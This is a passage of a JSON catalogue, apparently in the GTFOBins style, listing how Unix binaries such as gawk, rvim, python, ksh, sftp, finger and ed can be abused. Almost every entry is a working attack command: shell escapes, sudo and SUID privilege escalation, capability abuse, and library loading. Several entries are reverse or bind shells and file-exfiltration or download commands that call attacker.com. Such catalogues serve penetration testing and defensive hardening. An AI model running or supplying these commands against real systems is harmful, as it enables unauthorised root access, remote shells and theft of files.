          "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ]
    }
  },
  "sftp": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "HOST=user@attacker.com\nsftp $HOST\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-upload": [
        {
          "code": "RHOST=user@attacker.com\nsftp $RHOST\nput file_to_send file_to_save\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=user@attacker.com\nsftp $RHOST\nget file_to_get file_to_save\n",
          "description": "It can download remote files."
        }
      ],
      "sudo": [
        {
          "code": "HOST=user@attacker.com\nsudo sftp $HOST\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "ed": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ed\n!/bin/sh\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "ed file_to_write\na\nDATA\n.\nw\nq\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "ed file_to_read\n,p\nq\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./ed file_to_read\n,p\nq\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ed\n!/bin/sh\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./ed\n!/bin/sh\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "gawk": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "gawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "RHOST=attacker.com\nRPORT=12345\ngawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {\n    s = \"/inet/tcp/0/\" RHOST \"/\" RPORT;\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "LPORT=12345\ngawk -v LPORT=$LPORT 'BEGIN {\n    s = \"/inet/tcp/\" LPORT \"/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-write": [
        {
          "code": "LFILE=file_to_write\ngawk -v LFILE=$LFILE 'BEGIN { print \"DATA\" > LFILE }'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "LFILE=file_to_read\ngawk '//' \"$LFILE\"\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./gawk '//' \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo gawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./gawk 'BEGIN {system(\"/bin/sh\")}'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "csh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "csh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./csh -b",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo csh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "emacs": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "emacs -Q -nw --eval '(term \"/bin/sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "file-write": [
        {
          "code": "emacs file_to_write\nDATA\nC-x C-s\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "emacs file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./emacs -Q -nw --eval '(term \"/bin/sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo emacs -Q -nw --eval '(term \"/bin/sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "aoss": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "aoss /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo aoss /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "rvim": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        },
        {
          "code": "rvim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n",
          "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "non-interactive-bind-shell": [
        {
          "code": "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n",
          "description": "It can bind a non-interactive shell to a local port to allow remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "rvim file_to_write\niDATA\n^[\nw\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "rvim file_to_read",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        },
        {
          "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ],
      "limited-suid": [
        {
          "code": "./rvim -c ':lua os.execute(\"reset; exec sh\")'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "python": {
    "description": "The payloads are compatible with both Python version 2 and 3.",
    "functions": {
      "shell": [
        {
          "code": "python -c 'import os; os.system(\"/bin/sh\")'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\npython -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export LPORT=8888\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\npython -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "python -c 'open(\"file_to_write\",\"w+\").write(\"DATA\")'",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "python -c 'print(open(\"file_to_read\").read())'",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "library-load": [
        {
          "code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ],
      "suid": [
        {
          "code": "./python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "capabilities": [
        {
          "code": "./python -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
          "description": "If the binary has the Linux `CAP_SETUID` capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID."
        }
      ]
    }
  },
  "varnishncsa": {
    "description": "This allows to write arbitrary files as root, provided that the proper HTTP response is made. Specifically the content of a certain header will be written in the file. First start `varnishncsa` as follows, then trigger the file write with:\n\n```\ncurl -H 'yyy: DATA' http://localhost:6081/xxx\n```\n",
    "functions": {
      "sudo": [
        {
          "code": "LFILE=file_to_write\nsudo varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_write\n./varnishncsa -g request -q 'ReqURL ~ \"/xxx\"' -F '%{yyy}i' -w \"$LFILE\"\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "cowsay": {
    "description": "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.",
    "functions": {
      "shell": [
        {
          "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "mysql": {
    "description": "A valid MySQL server must be available.",
    "functions": {
      "shell": [
        {
          "code": "mysql -e '\\! /bin/sh'",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo mysql -e '\\! /bin/sh'",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./mysql -e '\\! /bin/sh'",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "library-load": [
        {
          "code": "mysql --default-auth ../../../../../path/to/lib",
          "description": "It loads shared libraries that may be used to run code in the binary execution context."
        }
      ]
    }
  },
  "capsh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "capsh --",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./capsh --gid=0 --uid=0 --",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo capsh --",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pry": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "pry\nsystem(\"/bin/sh\")\n",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "sudo": [
        {
          "code": "sudo pry\nsystem(\"/bin/sh\")\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "limited-suid": [
        {
          "code": "./pry\nsystem(\"/bin/sh\")\n",
          "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ss": {
    "description": "The file content is actually parsed so only a part of the first line is returned as a part of an error message.\n",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nss -a -F $LFILE\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./ss -a -F $LFILE\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo ss -a -F $LFILE\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "msgmerge": {
    "description": "The file is parsed and displayed as a Java `.properties` file, so this may not be suitable to read arbitrary binary data.",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\nmsgmerge -P $LFILE /dev/null\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo msgmerge -P $LFILE /dev/null\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ],
      "suid": [
        {
          "code": "LFILE=file_to_read\n./msgmerge -P $LFILE /dev/null\n",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ]
    }
  },
  "ksu": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo ksu -q -e /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "7z": {
    "description": "",
    "functions": {
      "file-read": [
        {
          "code": "LFILE=file_to_read\n7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "sudo": [
        {
          "code": "LFILE=file_to_read\nsudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so\n",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "pkexec": {
    "description": "",
    "functions": {
      "sudo": [
        {
          "code": "sudo pkexec /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "env": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "env /bin/sh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "suid": [
        {
          "code": "./env /bin/sh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo env /bin/sh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "finger": {
    "description": "`finger` hangs waiting for the remote peer to close the socket.\n",
    "functions": {
      "file-upload": [
        {
          "code": "RHOST=attacker.com\nLFILE=file_to_send\nfinger \"$(base64 $LFILE)@$RHOST\"\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "RHOST=attacker.com\nLFILE=file_to_save\nfinger x@$RHOST | base64 -d > \"$LFILE\"\n",
          "description": "It can download remote files."
        }
      ]
    }
  },
  "ksh": {
    "description": "",
    "functions": {
      "shell": [
        {
          "code": "ksh",
          "description": "It can be used to break out from restricted environments by spawning an interactive system shell."
        }
      ],
      "reverse-shell": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nksh -c 'ksh -i > /dev/tcp/$RHOST/$RPORT 2>&1 0>&1'\n",
          "description": "It can send back a reverse shell to a listening attacker to open a remote network access."
        }
      ],
      "file-upload": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'echo -e \"POST / HTTP/0.9\\n\\n$(cat $LFILE)\" > /dev/tcp/$RHOST/$RPORT'\n",
          "description": "It can exfiltrate files on the network."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'\n",
          "description": "It can exfiltrate files on the network."
        }
      ],
      "file-download": [
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c '{ echo -ne \"GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n\" 1>&3; cat 0<&3; } \\\n    3<>/dev/tcp/$RHOST/$RPORT \\\n    | { while read -r; do [ \"$REPLY\" = \"$(echo -ne \"\\r\")\" ] && break; done; cat; } > $LFILE'\n",
          "description": "It can download remote files."
        },
        {
          "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_get\nksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'\n",
          "description": "It can download remote files."
        }
      ],
      "file-write": [
        {
          "code": "export LFILE=file_to_write\nksh -c 'echo DATA > $LFILE'\n",
          "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system."
        }
      ],
      "file-read": [
        {
          "code": "export LFILE=file_to_read\nksh -c 'echo \"$(<$LFILE)\"'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        },
        {
          "code": "export LFILE=file_to_read\nksh -c $'read -r -d \\x04 < \"$LFILE\"; echo \"$REPLY\"'\n",
          "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system."
        }
      ],
      "suid": [
        {
          "code": "./ksh -p",
          "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.\n"
        }
      ],
      "sudo": [
        {
          "code": "sudo ksh",
          "description": "If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access."
        }
      ]
    }
  },
  "systemd-resolve": {
    "description": "",
